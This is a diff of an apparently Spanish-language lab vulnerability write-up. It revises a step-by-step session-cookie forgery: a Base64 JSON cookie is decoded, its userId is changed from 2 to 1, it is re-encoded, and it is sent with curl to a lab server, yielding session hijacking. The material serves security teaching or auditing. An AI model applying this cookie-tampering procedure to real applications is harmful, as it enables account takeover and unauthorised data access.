@@ -105,18 +105,18 @@ PASO 2 — Decodificar Base64 (CyberChef: From Base64):
   → {"userId":2,"username":"alice","role":"user"}
 
 PASO 3 — Manipular JSON (CyberChef: editar campo):
-  Cambiar: "role":"user"
-  Por    : "role":"admin"
-  JSON adulterado: {"userId":2,"username":"alice","role":"admin"}
+  Cambiar: "userId":2
+  Por    : "userId":1
+  JSON adulterado: {"userId":1,"username":"alice","role":"user"}
 
 PASO 4 — Re-codificar en Base64 (CyberChef: To Base64):
-  eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ==
+  eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9
 
 PASO 5 — Inyectar cookie en cabecera HTTP (Burp Suite / curl):
   curl http://192.168.56.20:4000/api/profile \
-       -H "Cookie: session=eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ=="
+       -H "Cookie: session=eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9"
 
-  Efecto: El servidor confía en role=admin → expone toda la BD.
+  Efecto: El servidor confía en userId=1 → Otorga acceso a la sesión del usuario con ID 1 (Secuestro de sesión).
 
 ================================================================================
  ID-2: FALLAS CRIPTOGRÁFICAS — MD5 sin salt (CWE-327/759/916)
